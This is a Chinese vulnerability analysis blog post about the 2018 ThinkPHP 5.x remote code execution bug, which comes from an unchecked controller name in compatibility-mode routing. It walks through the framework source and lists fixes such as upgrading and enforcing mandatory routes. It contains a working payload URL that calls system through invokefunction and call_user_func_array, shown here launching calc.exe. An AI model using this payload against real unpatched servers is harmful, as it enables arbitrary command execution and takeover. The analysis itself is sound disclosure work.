\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[blog.riskivy.com\](https://blog.riskivy.com/thinkphp5-x%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/)

前言
--

2018 年 12 月 9 日，ThinkPHP5.\* 版本发布[安全更新](https://blog.thinkphp.cn/869075)，本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的 getshell 漏洞。  
[![](https://blog.riskivy.com/wp-content/uploads/2018/12/1-1.png)](https://blog.riskivy.com/wp-content/uploads/2018/12/1-1.png)

漏洞复现
----

环境

```
http://www.thinkphp.cn/down/1260.html //官网下载ThinkPHP5.0.22完整版
PHP-7.0.12-NTS + Apache


```

Payload:  
这里 vars\[0\] 为 call\_user\_func\_array 调用的函数名，vars\[1\]\[\] 为调用的函数参数。

```
http://127.0.0.1/thinkphp\_5.0.22\_with\_extend/public/index.php?s=index/\\think\\app/invokefunction&function=call\_user\_func\_array&vars\[0\]=system&vars\[1\]\[\]=C:\\WINDOWS\\System32\\calc.exe


```

将下载的 thinkphp 解压到自己的 web 应用目录中，访问上述 Payload，即可触发漏洞，弹出计算器。

[![](https://blog.riskivy.com/wp-content/uploads/2018/12/2-1.png)](https://blog.riskivy.com/wp-content/uploads/2018/12/2-1.png)

phpinfo()  
[![](https://blog.riskivy.com/wp-content/uploads/2018/12/3-1.png)](https://blog.riskivy.com/wp-content/uploads/2018/12/3-1.png)

漏洞分析
----

观察 payload，可以发现其是 thinkPHP 兼容模式的路由，其格式类似如下：

```
http://localhost/?s=\[模块/控制器/操作?\]参数1=值1&参数2=值2


```

其对应的控制器类似：

```
<?php
namespace app\\index\\controller; //模块名为index

class Index //控制器名
{
    public function index() //操作方法
    {
        return 'hello world';
    }
}


```

当我们访问`http://localhost/?s=/index/index/index`路由的情况下，ThinkPHP 会调用 index 模块下的 index 控制器的 index 操作方法，页面输出 Hello World。

兼容模式的路由大致流程就是这样，接下来开始具体分析一下漏洞 Payload，当我们输入 URL 的时候，ThinkPHP 会从入口文件进入，并执行 thinkphp 目录下的启动文件`start.php`。

```
// 2. 执行应用
App::run()->send();


```

将会执行`thinkphp//library/think/App.php`的`run`函数，在执行过程中，会调用`thinkphp/libray/think/Route.php`下的 parseUrl 进行 URL 解析，而在 parseUrl 函数又同时调用 parseUrlPath 根据`/`分隔符进行路径分割。

```
/\*\*
     \* 解析URL的pathinfo参数和变量
     \* @access private
     \* @param string $url URL地址
     \* @return array
     \*/
    private static function parseUrlPath($url)
    {
        // 分隔符替换 确保路由定义使用统一的分隔符
        $url = str\_replace('|', '/', $url);
        $url = trim($url, '/');
        $var = \[\];
        if (false !== strpos($url, '?')) {
            // \[模块/控制器/操作?\]参数1=值1&参数2=值2...
            $info = parse\_url($url);
            $path = explode('/', $info\['path'\]);
            parse\_str($info\['query'\], $var);
        } elseif (strpos($url, '/')) {
            // \[模块/控制器/操作\]
            $path = explode('/', $url);
        } else {
            $path = \[$url\];
        }
        return \[$path, $var\];
    }


```

得出来的路径分割结果如下：

```
$path = {"index", "\\think\\app" ,"invokefunction"}//分别对应模块名，控制器名，操作方法
//最终结果格式
$result = \['type' => 'module', 'module' => {"index", "\\think\\app" ,"invokefunction"}\] 


```

接下来`run`将会继续调用`exec`函数进行调用分发。`$dispatch`参数为前面的路径分割结果。

```
$data = self::exec($dispatch, $config);


```

`exec`中将会调用`module`执行对应的模块操作。

```
case 'module': // 模块/控制器/操作
                $data = self::module( //调用module函数
                    $dispatch\['module'\],
                    $config,
                    isset($dispatch\['convert'\]) ? $dispatch\['convert'\] : null
                );
                break;


```

`module`函数也正是官方修复的地方，观察官方注释可以知道这是一个执行模块方法的函数，首先其会根据我们`$dispatch['module']`数组获取模块名，控制器名，操作方法名，代码如下

```
/\*\*
     \* 执行模块
     \* @access public
     \* @param array $result 模块/控制器/操作
     \* @param array $config 配置参数
     \* @param bool $convert 是否自动转换控制器和操作名
     \* @return mixed
     \* @throws HttpException
     \*/
    public static function module($result, $config, $convert = null)
    {
       $module = strip\_tags(strtolower($result\[0\] ?: $config\['default\_module'\])); //获取模块名   $module = index
        ... 
        // 当前模块路径
        App::$modulePath = APP\_PATH . ($module ? $module . DS : '');//模块的真实路径

        // 是否自动转换控制器和操作名
        $convert = is\_bool($convert) ? $convert : $config\['url\_convert'\];

        // 获取控制器名
        $controller = strip\_tags($result\[1\] ?: $config\['default\_controller'\]);
        $controller = $convert ? strtolower($controller) : $controller; //$controller = \\think\\app

        // 获取操作名
        $actionName = strip\_tags($result\[2\] ?: $config\['default\_action'\]); //$actionName = 
        if (!empty($config\['action\_convert'\])) {
            $actionName = Loader::parseName($actionName, 1);
        } else {
            $actionName = $convert ? strtolower($actionName) : $actionName;
        }      
        ....
    }


```

[![](https://blog.riskivy.com/wp-content/uploads/2018/12/4-1.png)](https://blog.riskivy.com/wp-content/uploads/2018/12/4-1.png)

而后会设置请求的控制器。

```
 // 设置当前请求的控制器、操作
        $request->controller(Loader::parseName($controller, 1))->action($actionName);


```

将会调用`thinkphp/library/think/Loader.php`中的 controller 函数，并返回调用类名。

```
public static function controller($name, $layer = 'controller', $appendSuffix = false, $empty = '')
    {
        list($module, $class) = self::getModuleAndClass($name, $layer, $appendSuffix);
        if (class\_exists($class)) {
            return App::invokeClass($class);
        }


```

需要注意的是其中获取 getModuleAndClass，解析模块和类名的方法，首先会判断是否控制器名是否存在`\`字符，存在的话，将会将其直接设置为类名。即此时类名为`\think\app`。而如果其为正常的类似 index 的正规控制器名的话，会调用 parseClass 拼接出类名来，类似`app\index\controller\Index`。

```
protected static function getModuleAndClass($name, $layer, $appendSuffix)
    {
        if (false !== strpos($name, '\\\\')) {
            $module = Request::instance()->module();
            $class = $name;
        } else {
            if (strpos($name, '/')) {
                list($module, $name) = explode('/', $name, 2);
            } else {
                $module = Request::instance()->module();
            }

            $class = self::parseClass($module, $layer, $name, $appendSuffix);
        }

        return \[$module, $class\];
    }


```

回到 moudle 函数中，将会通过反射获取操作方法名，即 invokefunction

```
if (is\_callable(\[$instance, $action\])) {
            // 执行操作方法
            $call = \[$instance, $action\];
            // 严格获取当前操作方法名
            $reflect = new \\ReflectionMethod($instance, $action);
            $methodName = $reflect->getName();
            $suffix = $config\['action\_suffix'\];
            $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;
            $request->action($actionName);

        } 


```

接着就会调用其具体的操作方法了

```
return self::invokeMethod($call, $vars); //$call = {think\\App , "invokefunction"}


```

[![](https://blog.riskivy.com/wp-content/uploads/2018/12/5-1.png)](https://blog.riskivy.com/wp-content/uploads/2018/12/5-1.png)

然后`invokeMethod`函数通过反射执行 invokefunction 方法，invokefunction 函数再通过反射执行`$function`参数，即我们 payload 中的的`call_user_func_array`， $vars\[\] 为 call\_user\_func\_array 的调用参数。即 payload 中的`vars[0]=system&vars[1][]=C:\WINDOWS\System32\calc.exe`，从而 call\_user\_func\_array 调用 sytem 命令执行，漏洞触发。

```
/\*\*
     \* 执行函数或者闭包方法 支持参数调用
     \* @access public
     \* @param string|array|\\Closure $function 函数或者闭包
     \* @param array $vars 变量
     \* @return mixed
     \*/
    public static function invokeFunction($function, $vars = \[\])
    {
        $reflect = new \\ReflectionFunction($function);//反射call\_user\_func\_array
        $args = self::bindParams($reflect, $vars);//bindParams合并多个参数到一个数组

        // 记录执行信息
        self::$debug && Log::record('\[ RUN \] ' . $reflect->\_\_toString(), 'info');

        return $reflect->invokeArgs($args);//调用
    }


```

[![](https://blog.riskivy.com/wp-content/uploads/2018/12/6-1.png)](https://blog.riskivy.com/wp-content/uploads/2018/12/6-1.png)

修复方案
----

1 升级最新版本（推荐）  
2 查看 GitHub 上 thinkPHP5 的 [commit](https://github.com/top-think/framework/commit/b4b3e90098143894c7da3a24bdff8a9b95ab29ec)。  
[![](https://blog.riskivy.com/wp-content/uploads/2018/12/7-1.png)](https://blog.riskivy.com/wp-content/uploads/2018/12/7-1.png)  
结合 Thinkphp 官方的描述，这次修复对控制器名进行了判断，判断是否符合正则（字母开头并且只包含字母数字下划线），只接受`index`这种格式的字符作为控制器，否则将会返回错误。  
3 强制路由模式，设置必须定义路由才能访问：

```
'url\_route\_on'          =>  true,
'url\_route\_must'        =>  true,


```

这种方式下面必须严格给每一个访问地址定义路由规则（包括首页），否则将抛出异常。

总结
--

ThinkPHP5.\* 漏洞成因正如官方所说 “由于框架对控制器名没有进行足够的检测”。导致可以操作 thinkphp 核心库下的操作方法，通过反射执行调用 call\_user\_func\_array 函数造成命令执行。

参考文献
----

1 https://blog.thinkphp.cn/869075  
2 https://github.com/top-think/framework/commit/b4b3e90098143894c7da3a24bdff8a9b95ab29ec

作者：斗象能力中心 TCC-tbag